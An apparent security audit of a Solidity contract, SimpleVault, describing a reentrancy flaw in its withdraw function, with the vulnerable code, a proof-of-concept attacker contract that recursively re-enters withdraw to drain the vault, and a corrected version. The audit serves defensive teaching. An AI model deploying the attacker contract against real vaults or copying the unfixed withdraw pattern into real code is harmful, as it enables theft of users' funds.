Security Audit Report: SimpleVault
Auditor: pythonmasterseo Date: 5 March 2026 Severity: Critical (High)

1. Executive Summary
This audit covers the SimpleVault smart contract. The review identified one critical vulnerability related to Reentrancy. This vulnerability allows an attacker to drain all ETH from the contract, bypassing balance checks.

2. Vulnerability Details
Title: Reentrancy Attack in withdraw Function
Severity: Critical

Description:The contract fails to follow the Checks-Effects-Interactions pattern. In the withdraw function, the contract sends ETH to the user before updating their internal balance.

This allows a malicious contract to recursively call withdraw before the first execution is complete, draining funds because the balance is not yet reduced.

Vulnerable Code Snippet:

// SPDX-License-Identifier: MITpragma solidity ^0.7.0;contract SimpleVault {    mapping(address => uint256) public balances;    function deposit() external payable {        require(msg.value > 0, "Must send ETH");        balances[msg.sender] += msg.value;    }    function withdraw(uint256 _amount) external {        require(balances[msg.sender] >= _amount, "Insufficient funds");                // VULNERABLE: External call happens BEFORE balance update        (bool sent, ) = msg.sender.call{value: _amount}("");        require(sent, "Failed to send ETH");        // State update happens too late        balances[msg.sender] -= _amount;    }}
Impact:
Complete loss of funds stored in the contract. An attacker can withdraw more ETH than they deposited.

3. Proof of Concept (PoC)
An attacker can deploy the following contract to exploit the vulnerability:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract AttackerContract {
    IVault public vault;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    // Step 1: Attack function
    function attack() external payable {
        require(msg.value >= 1 ether, "Need ETH");
        vault.deposit{value: 1 ether}(); // Deposit initial funds
        vault.withdraw(1 ether); // Start the attack
    }

    // Step 2: Malicious fallback function
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether); // Re-enter before balance update
        }
    }
}
4. Recommendations
Apply the Checks-Effects-Interactions pattern. Update the state before making external calls.

Fixed Code:

solidity

function withdraw(uint256 _amount) external {
    require(balances[msg.sender] >= _amount, "Insufficient funds");

    // 1. Effects: Update state FIRST
    balances[msg.sender] -= _amount;

    // 2. Interactions: Send ETH LAST
    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send ETH");
}
Additionally, consider using OpenZeppelin's ReentrancyGuard modifier for added protection.

5. Conclusion
The SimpleVault contract contains a critical vulnerability that must be fixed before deployment. The recommended fix successfully mitigates the risk.
